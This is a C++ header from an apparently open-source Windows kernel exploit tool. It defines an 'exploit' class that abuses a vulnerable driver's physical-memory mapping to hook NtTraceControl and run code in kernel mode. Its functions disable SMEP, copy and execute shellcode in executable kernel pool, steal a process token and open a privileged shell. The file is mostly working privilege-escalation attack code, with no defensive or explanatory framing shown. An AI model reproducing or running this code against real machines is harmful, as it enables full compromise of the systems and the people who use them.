/*

    MIT License

    Copyright (c) 2021 Kento Oki

    Permission is hereby granted, free of charge, to any person obtaining a copy
    of this software and associated documentation files (the "Software"), to deal
    in the Software without restriction, including without limitation the rights
    to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
    copies of the Software, and to permit persons to whom the Software is
    furnished to do so, subject to the following conditions:

    The above copyright notice and this permission notice shall be included in all
    copies or substantial portions of the Software.

    THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
    IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
    FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
    AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
    LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
    OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
    SOFTWARE.

*/

#pragma once
#include <windows.h>
#include <functional>
#include <memory>

#include "logger.hpp"
#include "impl.hpp"
#include "stub.hpp"
#include "hook.hpp"
#include "helper.hpp"

#include "../libphys/libphys.h"

using PEPROCESS = PVOID;
using PACCESS_TOKEN = PVOID;

using PsGetCurrentProcessId = HANDLE(__fastcall*)(void);
using PsLookupProcessByProcessId = NTSTATUS(__fastcall*)(HANDLE ProcessId, PEPROCESS Process);
using PsReferencePrimaryToken = PACCESS_TOKEN(__fastcall*)(PEPROCESS Process);
using PsDereferencePrimaryToken = void(__fastcall*)(PACCESS_TOKEN PrimaryToken);
using ObDereferenceObject = void(__fastcall*)(PVOID Object);
using ExAllocatePool = PVOID(__fastcall*)(POOL_TYPE PoolType, SIZE_T NumberOfBytes);
using ExFreePool = void(__fastcall*)(PVOID p);

using fn_disable_smep_t = void(__fastcall*)(unsigned long long* old_cr4);
using fn_enable_smep_t = void(__fastcall*)(unsigned long long* old_cr4);
using fn_user_function_t = void(*)();

class exploit
{
public:
    explicit exploit(std::string hook_function_name = "NtTraceControl");
    ~exploit();

    bool execute();
    void open_shell();

    // execute memcpy in the CPL0 context
    void kmemcpy(void* dst, void* src, size_t size);

    bool disable_smep(unsigned long long* old_cr4);
    bool enable_smep(unsigned long long* old_cr4);
    void exec_in_kernel(fn_user_function_t user_function);

    template <class FnType, class ... Args>
    std::invoke_result_t<FnType, Args ...> execute_shellcode_in_kernel(
        uint8_t* shellcode, size_t shellcode_size, Args ... augments)
    {
        constexpr auto is_ret_type_void =
            std::is_same<
                std::invoke_result_t< FnType, Args... >, void >{};

        // 1. allocate non-paged pool with rwx rights in kernel virtual memory
        const auto pool = this->kernel_invoke<ExAllocatePool>(
            reinterpret_cast<void*>(
                this->ntoskrnl_image_base +
                ntoskrnl::singleton().find_export("ExAllocatePool").as_rva()),
            NonPagedPoolExecute, sizeof(shellcode_size));

        if constexpr (is_ret_type_void)
        {
            if (!pool)
                return;
        }
        else
        {
            if (!pool)
                return {};
        }

        // 2. copy to the allocated pool
        this->kmemcpy(pool, shellcode, shellcode_size);

        if constexpr (is_ret_type_void)
        {
            this->kernel_invoke<FnType>(pool, augments ...);

            this->kernel_invoke<ExFreePool>(
                reinterpret_cast<void*>(
                    this->ntoskrnl_image_base +
                    ntoskrnl::singleton().find_export("ExFreePool").as_rva()),
                pool);
            
            return;
        }
        else
        {
            const auto invoke_result =
                this->kernel_invoke<FnType>(pool, augments ...);

            this->kernel_invoke<ExFreePool>(
                reinterpret_cast<void*>(
                    this->ntoskrnl_image_base +
                    ntoskrnl::singleton().find_export("ExFreePool").as_rva()),
                pool);

            return invoke_result;
        }
    }

    template <class FnType, class ... Args>
    std::invoke_result_t<FnType, Args ...> kernel_invoke(
        void* detour, Args ... augments)
    {
        static auto procedure =
            reinterpret_cast<void*>(
                GetProcAddress(
                    GetModuleHandle(TEXT("ntdll.dll")),
                    this->hook_function_name.c_str()));

        constexpr auto is_ret_type_void =
            std::is_same<
                std::invoke_result_t< FnType, Args... >, void >{};

        auto kernel_hook = hook_handler(this->hook_target_on_mapped_va, detour);
        kernel_hook.exec(false);

        if constexpr (is_ret_type_void)
        {
            reinterpret_cast<FnType>(procedure)(augments ...);
        }
        else
        {
            const auto invoke_result =
                reinterpret_cast<FnType>(procedure)(augments ...);

            kernel_hook.unhook();

            return invoke_result;
        }

        kernel_hook.unhook();
    }

    template<typename ... Args>
    static exploit& singleton(Args ... augments)
    {
        static exploit instance(augments ...);
        return instance;
    }

    void set_hook_base(void* pointer)
    {
        this->hook_target_on_mapped_va = pointer;
    }

    uint8_t hook_target_stub[30] = { 0 };
    uint64_t ntoskrnl_image_base;
private:
    bool steal_token();

    std::string hook_function_name;
    void* hook_target;
    void* hook_target_on_mapped_va;
};

static bool validation_callback(void* addr)
{
    const uint8_t* byte_array = reinterpret_cast<uint8_t*>(addr);

    printf("\r");
    print_info("scanning 0x%llX -> { %02X %02X %02X %02X ... }",
        addr,
        byte_array[0], byte_array[1], byte_array[2], byte_array[3]);

    if (memcmp(
        addr,
        exploit::singleton().hook_target_stub,
        sizeof(exploit::singleton().hook_target_stub)) == 0)
    {
        printf("\n");
        print_good("stub found at 0x%llX\n", addr);

        exploit::singleton().set_hook_base(addr);

        return true;
    }

    return false;
}

static void* map_callback(uint64_t phys_addr, size_t size)
{
    const auto mapped_phys = msio::map_phys(phys_addr, size);
    const auto mapped_va = mapped_phys.mapped_va;
    return reinterpret_cast<void*>(mapped_va);
}

static void unmap_callback(uint64_t phys_addr, size_t size)
{
    return msio::unmap_phys({ size, phys_addr });
}
